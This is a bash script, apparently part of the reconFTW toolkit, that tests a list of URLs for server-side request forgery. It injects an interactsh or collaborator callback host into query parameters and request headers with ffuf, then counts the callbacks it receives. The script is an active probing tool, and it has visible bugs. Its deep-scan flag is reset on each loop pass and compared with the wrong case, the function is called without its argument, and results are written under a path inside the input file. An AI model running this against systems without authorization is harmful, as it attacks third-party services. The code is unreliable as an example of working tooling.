#!/bin/bash

# Default config path
CONFIG_PATH="${RECONFTW_CFG}"

# Check if the config file exists
if [[ -f ${CONFIG_PATH} ]]; then
	source "${CONFIG_PATH}"
else
	echo "Error: reconftw.cfg not found at ${CONFIG_PATH}!"
	exit 1
fi

# Help menu
display_help() {
	echo "$(basename "$0") [Options]"
	echo
	echo "  -f, --file              File containing domains for web probing"
	echo "  -o, --output-dir        Output dir location"
	echo "  -h, --help              Display this help and exit"
	echo
	echo "Example: $0 -f input.txt -o output.txt"
	exit 1
}

# Parse input arguments
while [[ $# -gt 0 ]]; do
	deep_flag="False"
	case $1 in
	-f | --file)
		input_file="$2"
		shift
		;;
	-o | --output)
		output_dir="$2"
		shift
		;;
	-d | --deep)
		deep_flag="True"
		shift
		;;
	-h | --help) display_help ;;
	*)
		echo "Unknown parameter passed: $1"
		exit 1
		;;
	esac
	shift
done

# Input validation
if [[ -z ${input_file} ]]; then
	display_help
	exit 1
fi

# Validate file
if [[ ! -f ${input_file} ]]; then
	echo "Error: Specified file does not exist or is not readable."
	exit 1
fi

mkdir -p .tmp 2>/dev/null

# Main SSRF checks function
function ssrf_checks() {
	local deep_flag=$1

	echo "[*] Starting SSRF checks"
	if [[ -z $COLLAB_SERVER ]]; then
		interactsh-client &>.tmp/ssrf_callback.txt &
		sleep 2
		COLLAB_SERVER_FIX="FFUFHASH.$(cat .tmp/ssrf_callback.txt | tail -n1 | cut -c 16-)"
		COLLAB_SERVER_URL="http://$COLLAB_SERVER_FIX"
		INTERACT=true
	else
		COLLAB_SERVER_FIX="FFUFHASH.$(echo ${COLLAB_SERVER} | sed -r "s/https?:\/\///")"
		INTERACT=false
	fi
	if [[ $deep_flag == true ]] || [[ $(cat ${input_file} | wc -l) -le $DEEP_LIMIT ]]; then
		cat ${input_file} | qsreplace ${COLLAB_SERVER_FIX} | anew -q .tmp/tmp_ssrf.txt
		cat ${input_file} | qsreplace ${COLLAB_SERVER_URL} | anew -q .tmp/tmp_ssrf.txt
		ffuf -v -H "${HEADER}" -t $FFUF_THREADS -rate $FFUF_RATELIMIT -w .tmp/tmp_ssrf.txt -u FUZZ 2>/dev/null | grep "URL" | sed 's/| URL | //' | anew -q ${input_file}/ssrf_requested_url.txt
		ffuf -v -w .tmp/tmp_ssrf.txt:W1,$tools/headers_inject.txt:W2 -H "${HEADER}" -H "W2: ${COLLAB_SERVER_FIX}" -t $FFUF_THREADS -rate $FFUF_RATELIMIT -u W1 2>/dev/null | anew -q ${input_file}/ssrf_requested_headers.txt
		ffuf -v -w .tmp/tmp_ssrf.txt:W1,$tools/headers_inject.txt:W2 -H "${HEADER}" -H "W2: ${COLLAB_SERVER_URL}" -t $FFUF_THREADS -rate $FFUF_RATELIMIT -u W1 2>/dev/null | anew -q ${input_file}/ssrf_requested_headers.txt
		sleep 5
		if [[ -s ".tmp/ssrf_callback.txt" ]]; then
			cat .tmp/ssrf_callback.txt | tail -n+11 | anew -q ${input_file}/ssrf_callback.txt
			NUMOFLINES=$(cat .tmp/ssrf_callback.txt | tail -n+12 | sed '/^$/d' | wc -l)
			[[ $INTERACT == true ]] && echo "SSRF: ${NUMOFLINES} callbacks received"
		fi
		echo "[+] Results are saved in ${input_file}/ssrf_*"
	else
		echo "[!] Skipping SSRF: Too many URLs to test, try with --deep flag"
	fi
	pkill -f interactsh-client &

}


ssrf_checks